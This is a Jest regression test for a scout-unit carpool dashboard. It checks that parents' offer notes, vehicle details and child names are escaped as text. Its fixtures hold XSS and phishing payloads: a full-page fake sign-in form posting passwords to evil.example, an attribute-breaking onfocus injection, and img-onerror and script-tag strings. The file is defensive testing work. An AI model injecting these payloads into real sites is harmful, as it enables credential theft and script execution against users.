/**
 * @jest-environment jsdom
 *
 * Parents write carpool offers (vehicle, notes) and register their children's
 * names, and every family of the unit sees them on the carpool dashboard. The
 * whole-template sanitizer lets forms and inline styles through, so a note was
 * enough to lay a fake sign-in form over the page. These fields are now
 * escaped as text where they are composed.
 */

jest.mock('../../spa/app.js', () => ({ translate: (key) => key }));
jest.mock('../../spa/api/api-activities.js', () => ({}));
jest.mock('../../spa/api/api-carpools.js', () => ({}));
jest.mock('../../spa/utils/PermissionUtils.js', () => ({
  canManageCarpools: () => false,
  canViewCarpools: () => true,
  isParent: () => true,
}));
jest.mock('../../spa/utils/OptimisticUpdateManager.js', () => ({
  OptimisticUpdateManager: jest.fn(),
  generateOptimisticId: jest.fn(),
}));
jest.mock('../../spa/utils/SkeletonUtils.js', () => ({
  skeletonCarpoolDashboard: jest.fn(),
  setButtonLoading: jest.fn(),
}));
jest.mock('../../spa/utils/DebugUtils.js', () => ({ debugLog: jest.fn(), debugError: jest.fn() }));
jest.mock('../../spa/config.js', () => ({ CONFIG: {} }));
jest.mock('../../spa/modules/OfflineManager.js', () => ({ offlineManager: {} }));
jest.mock('../../spa/indexedDB.js', () => ({}));
jest.mock('../../spa/utils/DialogUtils.js', () => ({}));
jest.mock('../../spa/utils/DOMUtils.js', () => ({ setContent: jest.fn(), loadStylesheet: jest.fn() }));
jest.mock('../../spa/utils/NotFoundUtils.js', () => ({ buildNotFoundMarkup: jest.fn() }));
jest.mock('../../spa/utils/DateUtils.js', () => ({ parseDate: (value) => value }));
jest.mock('../../spa/utils/PerformanceUtils.js', () => ({ withButtonLoading: jest.fn() }));
jest.mock('../../spa/utils/ActivityDateUtils.js', () => ({
  formatActivityDateRange: () => '',
  getActivityStartDate: () => null,
}));

const { CarpoolDashboard } = require('../../spa/carpool_dashboard.js');

const PHISHING_NOTE = '<form action="https://evil.example/steal" style="position:fixed;inset:0">'
  + '<input name="password"><button>Sign in</button></form>';
const QUOTE_BREAK = 'Honda" autofocus onfocus="alert(1)';

const OFFER = {
  id: 9,
  user_id: 'driver-1',
  driver_name: '<img src=x onerror=alert(1)>Marie',
  vehicle_make: QUOTE_BREAK,
  vehicle_color: '<b>Red</b>',
  notes: PHISHING_NOTE,
  total_seats_available: 4,
  trip_direction: 'both',
  seats_used_going: 1,
  seats_used_return: 1,
  assignments: [{
    assignment_id: 1, participant_id: 3, trip_direction: 'both',
    participant_name: '<script>alert(1)</script>Léa',
  }],
};

function dashboard() {
  const page = new CarpoolDashboard({ showMessage: jest.fn() }, 1);
  page.activity = { name: '<i>Camp</i>' };
  return page;
}

describe('carpool dashboard text from families', () => {
  test('an offer card shows notes, vehicle, driver and child names as text', () => {
    document.body.innerHTML = dashboard().renderCarpoolOfferCard(OFFER);

    expect(document.querySelector('form')).toBeNull();
    expect(document.querySelector('img, script, b, input')).toBeNull();
    expect(document.body.textContent).toContain(PHISHING_NOTE);
    expect(document.body.textContent).toContain('<img src=x onerror=alert(1)>Marie');
    expect(document.body.textContent).toContain('<script>alert(1)</script>Léa');
  });

  test('editing an offer keeps a quote in the vehicle inside its field', () => {
    const page = dashboard();
    page.showModal = jest.fn();
    page.showOfferRideModal(OFFER);
    document.body.innerHTML = page.showModal.mock.calls[0][1];

    const make = document.querySelector('#vehicle-make');
    expect(make.value).toBe(QUOTE_BREAK);
    expect(make.hasAttribute('onfocus')).toBe(false);
    expect(document.querySelector('#notes').value).toBe(PHISHING_NOTE);
  });
});
